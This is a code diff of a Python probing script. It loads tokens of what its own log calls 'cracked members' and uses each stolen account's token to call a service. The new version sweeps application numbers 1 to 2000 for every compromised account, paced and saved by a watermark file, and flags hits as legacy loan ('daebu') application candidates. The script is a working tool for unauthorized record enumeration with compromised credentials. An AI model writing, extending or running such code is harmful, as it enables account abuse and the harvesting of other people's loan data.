@@ -91,9 +91,9 @@ def history(cls_filter=None):
 def main():
     creds = tokstore.load()
     if not creds:
-        log("LCHKMAP2 no cracked members")
+        log("LCHKMAP3 no cracked members")
         return
-    log("LCHKMAP2 START")
+    log("LCHKMAP3 START")
     by_mob = {c["mobile"]: c for c in creds}
 
     # historical F values per subject
@@ -101,7 +101,7 @@ def main():
     for r in history("F"):
         fvals.setdefault(r.get("subject", ""), []).append(r["value"])
     if not fvals:
-        log("LCHKMAP2 no historical F values")
+        log("LCHKMAP3 no F history")
         return
 
     # R1: re-probe F values for their subject
@@ -120,43 +120,45 @@ def main():
             log(f"R1 {mob} {v} -> {cls} {tag}")
             time.sleep(PACE)
 
-    # R2: neighbourhood around the FIRST F value of the primary subject
-    prim = next(iter(fvals))
-    cr = by_mob.get(prim)
-    if cr:
-        v0 = int(min(x for x in fvals[prim] if x.isdigit()))
-        hoods = [str(x) for x in (v0 - 1, v0 + 1, v0 // 10, v0 * 10,
-                                  v0 - 10, v0 + 10) if x > 0]
-        hist = {r["value"] for r in history()}
-        for v in hoods:
-            if spent >= BUDGET or v in hist:
+    # R2: systematic low-range sweep for EVERY subject (F-points = that
+    # subject's legacy daebu-linked application numbers). Watermark per
+    # subject in lchk_sweep_watermark.json; 0.4s pace, budget-bound.
+    wm_fp = os.path.join(HERE, "lchk_sweep_watermark.json")
+    watermarks = {}
+    if os.path.exists(wm_fp):
+        try:
+            watermarks = json.load(open(wm_fp))
+        except Exception:
+            watermarks = {}
+    SWEEP_LO, SWEEP_HI = 1, 2000
+    per_subj = max(10, (BUDGET - spent) // max(1, len(creds)))
+    for cr in creds:
+        mob = cr["mobile"]
+        wm = int(watermarks.get(mob, SWEEP_LO))
+        if wm >= SWEEP_HI:
+            continue
+        hist = {r["value"] for r in history() if r.get("subject") == mob}
+        n_new = 0
+        for v in range(wm, min(wm + 120, SWEEP_HI)):
+            if n_new >= per_subj:
+                break
+            sv = str(v)
+            if sv in hist:
                 continue
             spent += 1
-            st, cls, snip = call(cr["token"], v)
-            record(prim, v, st, cls, snip)
-            log(f"R2 {prim} {v} -> {cls}")
+            st, cls, snip = call(cr["token"], sv)
+            record(mob, sv, st, cls, snip)
+            hist.add(sv)
+            n_new += 1
+            if cls == "F":
+                log(f"FPOINT {mob} {sv} <- legacy application candidate")
             time.sleep(PACE)
+        if n_new:
+            watermarks[mob] = wm + n_new
+            with open(wm_fp, "w") as f:
+                json.dump(watermarks, f)
 
-    # R3: cross-subject probe of F values with other members' tokens
-    others = [c for c in creds if c["mobile"] != prim]
-    fv_set = sorted(set(fvals.get(prim, [])))
-    for oc in others:
-        for v in fv_set:
-            if spent >= BUDGET:
-                break
-            spent += 1
-            st, cls, snip = call(oc["token"], v)
-            record(oc["mobile"], v, st, cls, snip)
-            log(f"R3 {oc['mobile']} {v} -> {cls}")
-            time.sleep(PACE)
-
-    # verdict summary over latest observations
-    latest = {}
-    for r in history():
-        latest[(r["subject"], r["value"])] = r["cls"]
-    sticky = [(s, v) for (s, v), c in latest.items() if c == "F"]
-    log(f"VERDICT latest-F={(sticky)} sticky_count={len(sticky)}")
-    log(f"LCHKMAP2 DONE spent={spent}")
+    log(f"LCHKMAP3 DONE spent={spent}")
 
 
 if __name__ == "__main__":
